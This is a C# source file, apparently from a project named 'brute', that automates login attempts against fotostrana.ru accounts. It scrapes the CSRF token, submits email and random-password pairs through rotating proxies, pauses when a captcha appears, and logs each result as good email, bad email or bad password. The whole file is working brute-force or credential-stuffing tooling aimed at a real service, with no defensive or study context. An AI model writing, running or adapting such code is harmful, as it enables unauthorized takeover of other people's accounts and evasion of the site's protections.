using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using xNet;
using Newtonsoft.Json;
using HtmlAgilityPack;
using System.Timers;
using System.ComponentModel;
using System.Runtime.CompilerServices;

namespace brute
{
    public class Unit : INotifyPropertyChanged
    {

        #region CONSTRUCTOR
        public Unit(string email)
        {
            Time = new Timer(1000);
            Time.Elapsed += Time_Elapsed;
            Time.AutoReset = false;

            UnitPassword = "EtaK1la";
            UnitEmail = email;
            UnitUserAgent = Http.FirefoxUserAgent();
            UnitRefId = random.Next(143053905, 943053905).ToString();
            UnitCookies.Add("ref_id", UnitRefId);
            Index++;    
        }
        #endregion

        #region PROPERTY

        public Timer Time;

        public static Random random = new Random();

        public static int Index;


        private bool unitIsWait= false;
        /// <summary>
        /// Флаг ожидания 
        /// </summary>
        public bool UnitIsWait
        {
            get
            {
                return unitIsWait;
            }
            set
            {
                if (unitIsWait != value)
                {
                    unitIsWait = value;
                    NotifyPropertyChanged();
                }
            }
        }


        private string unitEmail = null;
        /// <summary>
        /// Email
        /// </summary>
        public string UnitEmail
        {
            get
            {
                return unitEmail;
            }
            set
            {
                if (unitEmail != value)
                {
                    unitEmail = value;
                    NotifyPropertyChanged();
                }
            }
        }

        private string unitPassword = null;

        /// <summary>
        /// Password
        /// </summary>
        public string UnitPassword
        {
            get
            {
                return unitPassword;
            }
            set
            {
                if (unitPassword != value)
                {
                    unitPassword = value;
                    NotifyPropertyChanged();
                }
            }
        }


        private string unitUserAgent = null;
        /// <summary>
        /// user agent
        /// </summary>
        public string UnitUserAgent
        {
            get
            {
                return unitUserAgent;
            }
            set
            {
                if (unitUserAgent != value)
                {
                    unitUserAgent = value;
                    NotifyPropertyChanged();
                }
            }
        }



        private CookieDictionary unitCookies;
        /// <summary>
        /// Куки 
        /// </summary>
        public CookieDictionary UnitCookies
        {
            get
            {
                if (unitCookies == null)
                {
                    unitCookies = new CookieDictionary();
                }
                return unitCookies;
            }
            set
            {
                if (unitCookies == null)
                {
                    unitCookies = new CookieDictionary();
                }

                if (unitCookies != value)
                {
                    unitCookies = value;
                }
            }
        }


        private Proxy unitProxy;
        /// <summary>
        /// Прокси класс
        /// </summary>
        public Proxy UnitProxy
        {
            get
            {
                if(unitProxy == null)
                {
                    unitProxy = Proxy.Settings;
                    unitProxy.ProxyMsg += UnitProxy_ProxyMsg;
                }
                return unitProxy;
            }
            set
            {
                if(unitProxy == null)
                {
                    unitProxy = Proxy.Settings;
                }
                if (unitProxy != value)
                    unitProxy = value;
            }
        }

        private void UnitProxy_ProxyMsg(string msg)
        {
            CallUnitMsg(msg);
        }

        private string unitRefId = null;

        /// <summary>
        /// Ref Id
        /// </summary>
        public string UnitRefId
        {
            get
            {
                return unitRefId;
            }
            set
            {
                if (unitRefId != value)
                {
                    unitRefId = value;
                    NotifyPropertyChanged();
                }
            }
        }


        private string unitProxyLine = null;

        /// <summary>
        /// Прокси строка
        /// </summary>
        public string UnitProxyLine
        {
            get
            {
                return unitProxyLine;
            }
            set
            {
                if (unitProxyLine != value)
                {
                    unitProxyLine = value;
                    NotifyPropertyChanged();
                }
            }
        }

        private string unitToken = null;
        /// <summary>
        /// Token = csrftkn
        /// </summary>
        public string UnitToken
        {
            get
            {
                return unitToken;
            }
            set
            {
                if (unitToken != value)
                {
                    unitToken = value;
                    NotifyPropertyChanged();
                }
            }
        }

        private bool unitIsEmpty = false;
        /// <summary>
        /// Флаг пустоты 
        /// </summary>
        public bool UnitIsEmpty
        {
            get
            {
                return unitIsEmpty;
            }
            set
            {
                if (unitIsEmpty != value)
                {
                    unitIsEmpty = value;
                    NotifyPropertyChanged();
                }
            }
        }


        private bool unitIsError = false;
        /// <summary>
        /// Флаг ошибки при работе с Unit
        /// </summary>
        public bool UnitIsError
        {
            get
            {
                return unitIsError;
            }
            set
            {
                if (unitIsError != value)
                {
                    unitIsError = value;
                    NotifyPropertyChanged();
                }
            }
        }
    
        #endregion

        #region METHODES

        /// <summary>
        /// Событие срабатывания таймера
        /// </summary>
        private void Time_Elapsed(object sender, ElapsedEventArgs e)
        {
            UnitIsWait = false;
        }

        /// <summary>
        /// Получение токена
        /// </summary>
        public void GetToken(byte[] stream)
        {
            CallUnitMsg("Get token");

            if (stream.Length == 0)
            {
                throw new  Exception("Ошибка парсинга токена.Входящий массив байт пуст.");
            }

            using (var sr = new StreamReader(new MemoryStream(stream)))
            {
                bool Stop = true;
                string line = "";
                while ((line = sr.ReadLine()) != null && Stop)
                {
                    if (line.Contains("name=\"csrftkn\""))
                    {
                        var doc = new HtmlDocument();
                        doc.Load(new StringReader(line));
                        var node = doc.DocumentNode.SelectNodes("//input");
                        UnitToken = node?.Last()?.Attributes?["value"].Value ?? null;
                        int i = UnitToken?.Length ?? 0;

                        if (i > 0)
                        {
                            Stop = false;
                        }
                    }
                }

                if(line == null)
                {
                    throw new Exception("Ошибка парсинга токена.Токен не найден.");
                }
            }
        }



        /// <summary>
        /// Регистрация 
        /// </summary>
        public void Registration()
        {
            CallUnitMsg("Registration start");
            var client = new HttpRequest();

            begin:;
            try
            {
                client.ClearAllHeaders();
                client.UserAgent = UnitUserAgent;
                client.CharacterSet = Encoding.UTF8;
                client.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                client.AddHeader("Accept-Language", "ru - RU,ru; q = 0.8,en - US; q = 0.5,en; q = 0.3");
                client.Cookies = UnitCookies;


                if (UnitProxy.ProxyUse && !UnitProxy.ProxyIsEmtpy)
                {
                    if(UnitProxyLine == null)
                    {
                        UnitProxyLine = UnitProxy.GetProxyLine();
                    }

                    UnitProxy.SetProxy(ref client, UnitProxyLine);
                }

                byte[] stream = client.Get("https://fotostrana.ru/signup/login/").ToBytes();

                GetToken(stream);

                client.CharacterSet = Encoding.Default;
                client.AddHeader("Accept-Language", "ru - RU,ru; q = 0.8,en - US; q = 0.5,en; q = 0.3");
                client.AddHeader("Accept", @"application/json, text/javascript, */*; q = 0.01");
                client.AllowAutoRedirect = true;
                client.AddHeader("X-Simple-Token:", UnitToken);
                client.AddHeader("X-Requested-With", "XMLHttpRequest");
                client.Referer = "https://fotostrana.ru/signup/login/";
                client.UserAgent = UnitUserAgent;
                client.Cookies = UnitCookies;

                GetPassword();

                string data = $"csrftkn={UnitToken}&user_email={UnitEmail}& user_password={UnitPassword}&submitted=1& issetFields%5B%5D=csrftkn&issetFields%5B%5D=user_email&issetFields%5B%5D=user_password&issetFields%5B%5D=submitted&_fs2ajax=1";

                CallUnitMsg("Попытка авторизации");
                string s = client.Post("https://fotostrana.ru/signup/signup/auth/", data, "application/x-www-form-urlencoded;charset=UTF-8").ToString();
                AnalizResult(s);
            }
            catch (Exception ex)
            {
               
                if (ex.Message == "Не удалось соединиться с HTTP-сервером 'fotostrana.ru'.")
                {
                    try
                    {
                        UnitProxy.WriteProxyToFile(UnitProxyLine, 1);
                    }
                    catch (Exception x)
                    {
                        MessageBox.Show(x.Message);
                    }
                    UnitProxyLine = null;
                    goto begin;
                }
                CallUnitMsg(ex.Message);
            }

        }

        /// <summary>
        /// Анализ ответа от сервера
        /// </summary>
        public void AnalizResult(string source)
        {
            CallUnitMsg("Анализирую ответ от сервера");

            if (source == null)
            {
                throw new Exception("Ошибка при анализе ответа ответа от сервера.Входная строка пуста.");
            }

            var result = JsonConvert.DeserializeObject<Rootobject>(source);

            if (result.ret != 1)
            { 
                if (result.data.user_id != "0")
                {
                    foreach (var item in result.errors)
                    {
                        if (item.ToString().Contains("captchaPopup"))
                        {
                            //Включить таймер
                            CallUnitMsg("Капча.");
                            Time.Start();
                            UnitIsWait = true;
                            return;
                        }                    
                    }

                    //TODO : Удалить эту почту
                    CallUnitMsg("result : Bad Email" + Environment.NewLine + $"Email : {UnitEmail}" + Environment.NewLine + $"Password : {UnitPassword}" + Environment.NewLine);
                    return;
                }
                else
                {
                    //Не правильный пароль
                    CallUnitMsg("result : Bad Password" + Environment.NewLine + $"Email : {UnitEmail}" + Environment.NewLine + $"Password : {UnitPassword}" + Environment.NewLine);
                }
            }
            else
            {
                //Сохранить
                CallUnitMsg("result : Good " + Environment.NewLine + $"Email : {UnitEmail}" + Environment.NewLine + $"Password : {UnitPassword}" + Environment.NewLine);
            }

        }

        public void GetPassword()
        {
            UnitPassword = String.Empty;
            string line = "abcdef0123456789";
          
            for (int i = 0; i < 8; i++)
            {
                UnitPassword += line[random.Next(line.Length)];
            }

            CallUnitMsg($"Установка пароля >> {UnitPassword}");
        }

        #endregion

        #region UNIT EVENTS

        /// <summary>
        /// Вызов события UnitMsg 
        /// </summary>
        /// <param name="msg">Сообщения</param>
        private void CallUnitMsg(string msg)
        {
            if (UnitMsg != null)
                UnitMsg(msg);
        }


        public delegate void UnitEventMsg(string msg);
        public event UnitEventMsg UnitMsg;
        #endregion

        #region INotifyPropertyChanged

        public event PropertyChangedEventHandler PropertyChanged;
        public void NotifyPropertyChanged([CallerMemberName] String propertyName = "")
        {
            if (PropertyChanged != null)
            {
                PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
            }
        }
        #endregion
    }



    /// <summary>
    /// Вспомогательные классы для анализа ответа от сервера
    /// </summary>
    public class Rootobject
    {
        public int ret { get; set; }
        public Data data { get; set; }
        public object[] errors { get; set; }
    }

    public class Data
    {
        public string result { get; set; }
        public string redirect_url { get; set; }
        public string user_id { get; set; }
        public int is_login { get; set; }
    }




}
